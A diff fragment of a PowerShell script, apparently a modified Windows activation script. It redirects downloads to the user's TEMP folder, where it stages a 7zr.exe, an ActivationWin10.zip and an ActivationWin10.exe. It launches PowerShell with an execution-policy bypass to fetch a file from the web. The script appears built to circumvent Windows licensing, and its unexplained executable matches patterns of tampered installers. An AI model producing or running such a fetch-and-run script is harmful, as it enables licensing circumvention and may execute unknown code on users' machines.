@@ -34,10 +34,10 @@ if ($hash -ne $releaseHash) {
 $rand = [Guid]::NewGuid().Guid
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
 $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
-$FilePath2 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.zip" } else { "$env:TEMP\ActivationWin10.zip" }
-$FilePath3 = if ($isAdmin) { "$env:SystemRoot\Temp\7zr.exe" } else { "$env:TEMP\7zr.exe" }
-$FilePath4 = if ($isAdmin) { "$env:SystemRoot\Temp\" } else { "$env:TEMP\" }
-$FilePath5 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.exe" } else { "$env:TEMP\ActivationWin10.exe" }
+$FilePath2 = "$env:TEMP\ActivationWin10.zip"
+$FilePath3 = "$env:TEMP\7zr.exe" 
+$FilePath4 = "$env:TEMP\" 
+$FilePath5 = "$env:TEMP\ActivationWin10.exe" 
 
 cd $FilePath4
 powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7zr.exe' -OutFile '$FilePath3'"
